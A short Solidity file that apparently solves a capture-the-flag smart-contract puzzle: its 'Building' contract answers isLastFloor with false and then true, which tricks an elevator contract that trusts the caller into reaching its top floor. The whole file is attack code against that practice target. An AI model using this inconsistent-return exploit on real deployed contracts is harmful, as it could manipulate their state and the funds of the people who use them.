// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract ElevatorInterface {
    function goTo(uint256 _floor) public virtual;
}

contract Building {
    ElevatorInterface elevatorContract;
    bool private called;

    constructor(address _elevatorContract) {
        elevatorContract = ElevatorInterface(_elevatorContract);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!called) {
            called = true;
            return false; // First call: enter the if block
        }
        return true; // Second call: set top = true
    }

    function goTo(uint256 _floor) public {
        called = false; // Reset for each attack
        elevatorContract.goTo(_floor);
    }
}